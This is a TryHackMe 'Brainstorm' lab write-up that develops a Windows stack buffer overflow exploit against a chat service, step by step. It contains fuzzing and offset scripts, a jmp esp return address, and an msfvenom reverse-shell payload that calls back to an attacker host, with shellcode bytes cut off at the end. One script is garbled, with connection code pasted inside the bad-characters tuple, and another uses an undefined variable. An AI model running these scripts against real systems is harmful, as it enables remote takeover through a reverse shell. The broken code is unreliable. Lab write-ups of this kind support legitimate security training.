---
layout: page
title: Brainstorm
description: Wrote buffer overflow exploit
img: 
importance: 3
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/brainstorm/logo.jpeg" title="THM Brainstorm Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/brainstorm">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Everyone put your thinking caps on!  Time to take on Brainstorm.

Run nmap to get a list of services running on the top ports.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$  sudo nmap -sC -sV -A -O -oN nmap -Pn 10.10.134.44
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 02:07 AEDT
Nmap scan report for 10.10.134.44
Host is up (0.27s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=brainstorm
| Not valid before: 2025-02-24T15:04:21
|_Not valid after:  2025-08-26T15:04:21
|_ssl-date: 2025-02-25T15:36:13+00:00; +13s from scanner time.
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Enumerate the FTP and download the chatserver.exe and essfunc.dll files.

{% capture enumerateftp %}
root@ip-10-10-84-177:~/Rooms/brainstorm# ftp 10.10.134.44
Connected to 10.10.134.44.
220 Microsoft FTP Service
Name (10.10.134.44:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  07:36PM       <DIR>          chatserver
226 Transfer complete.
ftp> cd chatserver
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  09:26PM                43747 chatserver.exe
08-29-19  09:27PM                30761 essfunc.dll
226 Transfer complete.
ftp> get chatserver.exe
local: chatserver.exe remote: chatserver.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
43747 bytes received in 0.15 secs (276.8167 kB/s)
ftp> get essfunc.dll
local: essfunc.dll remote: essfunc.dll
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
30761 bytes received in 0.00 secs (17.1555 MB/s)
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=enumerateftp %}

<br />
Set-up a Windows machine run Windbg, with the narly extension, and tranfer the binary we found to the lab machine.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/setup.png" title="Set-up" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Load up the binary in Windbg and enter g to go.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/load.png" title="Load binary" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Get the Windows IP address so we can connect to the new service.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/ip.png" title="Get IP Address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use netcat to interact with the service so we can get an idea of the normal operations.

{% capture ncservice %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ nc 192.168.20.23 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): Blart
Write a message: My Message


Wed Feb 26 06:14:37 2025
Blart said: My Message


Write a message:  biteme


Wed Feb 26 06:14:48 2025
Blart said: biteme


Write a message:  0123456789abcdef1011123


Wed Feb 26 06:15:18 2025
Blart said: 0123456789abcdef1011123


Write a message:  ^C
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ nc 192.168.20.23 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): 012345678901234567890
Write a message: sdfsfsd


Wed Feb 26 06:15:40 2025
01234567890123456789 said: sdfsfsd


Write a message:  ^C
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ nc 192.168.20.23 9999                                                                                                      
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): 01234567890abcdef01234567890abcdef
Write a message: liar


Wed Feb 26 06:16:30 2025
01234567890abcdef012 said: liar


Write a message:
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ncservice %}

<br />
Create a python script that connects to the service normally so we can break it later.

{% capture exploit00 %}
import socket

ip = '192.168.20.23'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))
print(s.recv(1024))
print(s.recv(1024))

s.send(b'Scotti\r\n')
print(s.recv(1024))

s.send(b'This is a test message\r\n')
print(s.recv(1024))

s.close()
{% endcapture %}
{% include terminal.html language='python' title='brainstorm_0x00.py' content=exploit00 %}

<br />
Update the script to fuzz the message prompt with increasing longer payloads to find the size that breaks.

{% capture exploit01 %}
import socket

ip = '192.168.20.23'
port = 9999

buffers = [b'A']
counter = 100
while len(buffers) < 50:
    buffers.append(b'A' * counter)
    counter += 200

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip,port))
    s.recv(1024)
    s.recv(1024)

    s.send(b'Scotti\r\n')
    s.recv(1024)

    print('[*] Sending: {sz}'.format(sz=len(inputBuffer)))
    s.send(inputBuffer + b'\r\n')
    s.recv(1024)

    s.close()
{% endcapture %}
{% include terminal.html language='python' title='brainstorm_0x01.py' content=exploit01 %}

<br />
Run the script and note the size at which the script hangs.

{% capture run01 %}
========= RESTART: /home/kali/Documents/thm/brainstorm/thm-bof_0x01.py =========
[*] Sending: 1
[*] Sending: 100
[*] Sending: 300
[*] Sending: 500
[*] Sending: 700
[*] Sending: 900
[*] Sending: 1100
[*] Sending: 1300
[*] Sending: 1500
[*] Sending: 1700
[*] Sending: 1900
[*] Sending: 2100
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=run01 %}

<br />
Check Windbg to ensure that our As (\x41s) overtake the EIP register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/initial.png" title="Initial Run" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the script to remove the fuzzer and hardcode the break value.

{% capture exploit02 %}
import socket

ip = '192.168.20.23'
port = 9999

inputBuffer = b'A' * 2100

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('[*] Connecting to program')
    s.connect((ip,port))
    s.recv(1024)
    s.recv(1024)

    print('[*] Sending the payload')
    s.send(b'Scotti\r\n')
    s.recv(1024)

    s.sendall(inputBuffer + b'\r\n')

    print('[*] Check the listener')
    s.close()
except:
    print('[-] The exploit failed')
{% endcapture %}
{% include terminal.html language='python' title='brainstorm_0x02.py' content=exploit02 %}

<br />
Run the script and double-check Windbg to ensure that we still have control of EIP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/hardcode.png" title="Hardcoded Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the ESP to see where the rest of the payload value.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/checkesp.png" title="Check the ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the msf-pattern_create to create a unique pattern.  This will (eventually) give us the offset to be able to fully control the EIP.

{% capture msfpatterncreate %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ msf-pattern_create -l 2100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=msfpatterncreate %}

<br />
Update that script with that pattern and run the script.

{% capture exploit03 %}
import socket

ip = '192.168.20.23'
port = 9999

#inputBuffer = b'A' * 2100
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('[*] Connecting to program')
    s.connect((ip,port))
    s.recv(1024)
    s.recv(1024)

    print('[*] Sending the payload')
    s.send(b'Scotti\r\n')
    s.recv(1024)

    s.sendall(inputBuffer + b'\r\n')

    print('[*] Check the listener')
    s.close()
except:
    print('[-] The exploit failed')
{% endcapture %}
{% include terminal.html language='python' title='brainstorm_0x03.py' content=exploit03 %}

<br />
Check the value in EIP and note the unique value.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/eipvalue.png" title="EIP Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the msf-pattern_offset with the query value from EIP to get the exact offset to be able to overwrite EIP.

{% capture msfpatternoffset %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ msf-pattern_offset -l 2100 -q 31704330
[*] Exact match at offset 2012
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=msfpatternoffset %}

<br />
Update the code with the hardcoded offset value.

{% capture exploit04 %}
import socket
from struct import pack

ip = '192.168.20.24'
port = 9999

# baddies = \x00

inputBuffer = b'A' * 2012
inputBuffer += b'B' * 4
inputBuffer += b'C' * (2500 - len(inputBuffer))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('[*] Connecting to program')
    s.connect((ip,port))
    s.recv(1024)
    s.recv(1024)

    print('[*] Sending the payload')
    s.send(b'Scotti\r\n')
    s.recv(1024)

    s.sendall(inputBuffer + b'\r\n')

    print('[*] Check the listener')
    s.close()
except:
    print('[-] The exploit failed')
{% endcapture %}
{% include terminal.html language='python' title='brainstorm_0x04.py' content=exploit04 %}

<br />
Check Windbg.  We should see the Bs (42s) in the EIP register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/eipregister.png" title="EIP Register" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to have all of the possible hex values so we can test for bad characters.  We will exclude \x00 since it is usually a bad character anyways.  Add 400 to the payload size.  Sometimes when you increase the size you mess with execution.  So we will have to double-check to ensure that we still have control of EIP.  Run the code.

{% capture exploit05 %}
import socket

ip = '192.168.20.23'
port = 9999

# baddies = \x00

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    print('[*] Connecting to program')
    s.connect((ip,port))
    s.recv(1024)
    s.recv(1024)

    print('[*] Sending the payload')
    s.send(b'Scotti\r\n')
    s.recv(1024)

    s.sendall(inputBuffer + b'\r\n')

    print('[*] Check the listener')
    s.close()
except:
    print('[-] The exploit failed')
)

inputBuffer = badchars
inputBuffer += b'A' * (2012 - len(inputBuffer))
inputBuffer += b'B' * 4
inputBuffer += b'C' * (2500 - len(inputBuffer))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('[*] Connecting to program')
    s.connect((ip,port))
    s.recv(1024)
    s.recv(1024)

    print('[*] Sending the payload')
    s.send(b'Scotti\r\n')
    s.recv(1024)

    s.sendall(inputBuffer + b'\r\n')

    print('[*] Check the listener')
    s.close()
except:
    print('[-] The exploit failed')
{% endcapture %}
{% include terminal.html language='python' title='brainstorm_0x05.py' content=exploit05 %}

<br />
Check the EIP Payload to ensure we have enough Cs for our payload.  We also still have control of EIP.  Nice.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/cpayload.png" title="Cs Payload" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check EAX for our hex values.  They all appear to be there so we should be good to go.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/eaxbadchars.png" title="EAX Bad Chars" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to return to normal execution with a shell payload.

{% capture exploit06 %}
import socket

ip = '192.168.20.23'
port = 9999

# baddies = \x00

payload = b'D' * 400

inputBuffer = b'A' * (2012 - len(inputBuffer))
inputBuffer += b'B' * 4
inputBuffer += payload
inputBuffer += b'C' * (2500 - len(inputBuffer))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('[*] Connecting to program')
    s.connect((ip,port))
    s.recv(1024)
    s.recv(1024)

    print('[*] Sending the payload')
    s.send(b'Scotti\r\n')
    s.recv(1024)

    s.sendall(inputBuffer + b'\r\n')

    print('[*] Check the listener')
    s.close()
except:
    print('[-] The exploit failed')
{% endcapture %}
{% include terminal.html language='python' title='brainstorm_0x06.py' content=exploit06 %}

<br />
Use the msf-nasm_shell shell to get the opcode equivalent for jmp esp.

{% capture msfnasmshell %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ msf-nasm_shell                        
nasm > jmp esp
00000000  FFE4              jmp esp
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=msfnasmshell %}

<br />
In WinDBG, load the narly module.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/narly.png" title="Narly Module" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use !nmod to get a list of the available modules.  We are looking for a module that doesn't have Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP) protections and no bad characters in the address range.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/modules.png" title="Modules" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Do a binary search for the opcode from nasm shell.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/search.png" title="Binary Search" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Reset WinDbg and set a break-point on the address that we chose.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/breakpoint.png" title="Set Breakpoint" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the memory address in the EIP space.  Run the code.

{% capture exploit07 %}
import socket
from struct import pack

ip = '192.168.20.23'
port = 9999

# baddies = \x00

payload = b'D' * 400

inputBuffer = payload
inputBuffer += b'A' * (2012 - len(inputBuffer))
inputBuffer += pack('<L',(0x625014df))
inputBuffer += b'C' * (2500 - len(inputBuffer))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('[*] Connecting to program')
    s.connect((ip,port))
    s.recv(1024)
    s.recv(1024)

    print('[*] Sending the payload')
    s.send(b'Scotti\r\n')
    s.recv(1024)

    s.sendall(inputBuffer + b'\r\n')

    print('[*] Check the listener')
    s.close()
except:
    print('[-] The exploit failed')
{% endcapture %}
{% include terminal.html language='python' title='brainstorm_0x07.py' content=exploit07 %}

<br />
Check WinDbg and ensure that we caught the jmp ESP breakpoint.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/catchbp.png" title="Catch Breakpoint" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Step one more time to see the code jump into esp.  We should see the Cs (43s).

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainstorm/esp.png" title="ESP Cs" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run msfvenom to generate a payload.

{% capture genpayload %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.20 LPORT=443 -f python -b '\x00'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1745 bytes
buf =  b""
buf += b"\xbf\xbe\xc5\x39\x8c\xda\xd1\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x52\x31\x7a\x12\x83\xea\xfc\x03\xc4"
buf += b"\xcb\xdb\x79\xc4\x3c\x99\x82\x34\xbd\xfe\x0b\xd1"
buf += b"\x8c\x3e\x6f\x92\xbf\x8e\xfb\xf6\x33\x64\xa9\xe2"
buf += b"\xc0\x08\x66\x05\x60\xa6\x50\x28\x71\x9b\xa1\x2b"
buf += b"\xf1\xe6\xf5\x8b\xc8\x28\x08\xca\x0d\x54\xe1\x9e"
buf += b"\xc6\x12\x54\x0e\x62\x6e\x65\xa5\x38\x7e\xed\x5a"
buf += b"\x88\x81\xdc\xcd\x82\xdb\xfe\xec\x47\x50\xb7\xf6"
